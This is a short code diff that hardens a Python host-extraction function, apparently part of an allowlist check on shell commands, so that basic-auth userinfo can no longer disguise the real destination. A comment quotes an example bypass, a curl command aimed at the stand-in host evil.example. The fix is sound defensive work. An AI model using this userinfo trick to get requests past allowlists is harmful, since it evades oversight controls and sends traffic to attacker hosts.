@@ -753,7 +753,14 @@ def _bare_hosts(toks: list[str]) -> list[str]:
                 if t in value_flags:
                     skip_next = True
                 continue
-            cand = t.split("/")[0].split(":")[0]
+            # Strip basic-auth userinfo BEFORE reading the host, exactly as
+            # the schemed-URL path does. `curl api.github.com:pw@evil.example/x`
+            # has authority `api.github.com:pw@evil.example` — splitting on
+            # ":" first yields `api.github.com`, an allowed host, while the
+            # request goes to `evil.example`. rsplit, because userinfo may
+            # itself contain "@". (Devin Review on this PR.)
+            authority = t.split("/")[0]
+            cand = authority.rsplit("@", 1)[-1].split(":")[0]
             if "." in cand and not cand.startswith("http"):
                 hosts.append(cand)
     return hosts
